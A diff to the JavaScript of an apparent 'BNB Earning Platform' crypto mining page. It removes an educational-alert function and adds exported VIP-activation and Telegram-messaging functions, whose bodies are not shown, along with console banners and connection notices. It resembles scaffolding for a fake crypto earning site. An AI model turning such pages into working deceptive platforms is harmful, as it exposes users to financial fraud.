-document.addEventListener('visibilitychange', function() {
-    if (document.hidden && isMining) {
-        console.log('Page hidden - mining would pause in real application');
-    }
-});
-
-// Export functions for global access (for demo purposes)
+// Export functions for global access
 window.startMining = startMining;
 window.stopMining = stopMining;
-window.showEducationalAlert = showEducationalAlert;
+window.activateVIP = activateVIP;
+window.showNotification = showNotification;
+window.sendTelegramMessage = sendTelegramMessage;
+
+// Console welcome message
+console.log('%c🚀 BNB Earning Platform', 'color: #F0B90B; font-size: 24px; font-weight: bold;');
+console.log('%cWelcome to the cryptocurrency earning platform!', 'color: #848E9C; font-size: 14px;');
+console.log('%c⚠️ This is an educational demonstration only.', 'color: #F6465D; font-size: 12px;');
+
+// Service Worker registration (for PWA capabilities)
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', function() {
+        console.log('Service Worker would be registered here in a production app');
+    });
+}
+
+// Handle page visibility changes
+document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+        console.log('Page hidden - activities paused');
+    } else {
+        console.log('Page visible - activities resumed');
+    }
+});
+
+// Handle online/offline status
+window.addEventListener('online', function() {
+    showNotification('Connection restored', 'success');
+});
+
+window.addEventListener('offline', function() {
+    showNotification('Connection lost - some features may not work', 'error');
+});
